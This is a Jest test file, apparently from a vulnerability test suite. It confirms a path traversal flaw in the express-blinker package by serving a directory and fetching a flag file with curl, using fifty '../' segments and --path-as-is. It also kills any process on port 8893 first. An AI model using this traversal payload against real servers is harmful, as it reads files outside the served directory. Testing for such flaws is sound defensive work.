const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v21 = '/..'.repeat(50);
    const v22 = v21 + pathToFlag;
    return v22;
};
const v39 = done => {
    const v23 = expect.assertions(1);
    v23;
    const express = require('express');
    let app = express();
    const pkg = require('express-blinker');
    const fs = require('fs');
    const v24 = require('child_process');
    const exec = v24.exec;
    const v25 = fs.readFileSync(pathToFlag);
    let hostsFile = v25.toString();
    const a = require('child_process');
    try {
        const v26 = () => {
        };
        const v27 = a.execSync('fuser -k 8893/tcp', v26);
        v27;
    } catch (e) {
    }
    const v28 = {
        test: /.*/,
        etag: true,
        lastModified: false,
        cacheControl: true,
        expires: false,
        age: 600
    };
    const v29 = [v28];
    const v30 = pkg(__dirname, v29);
    const v31 = app.use(v30);
    v31;
    const v32 = app.listen(8893);
    v32;
    const v33 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8893${ v33 }"`;
    const v37 = (error, stdout) => {
        const v34 = expect(stdout);
        const v35 = v34.toBe(hostsFile);
        v35;
        const v36 = done();
        v36;
    };
    const v38 = exec(attack_string, v37);
    v38;
};
const v40 = test('Path Traversal in express-blinker', v39);
v40;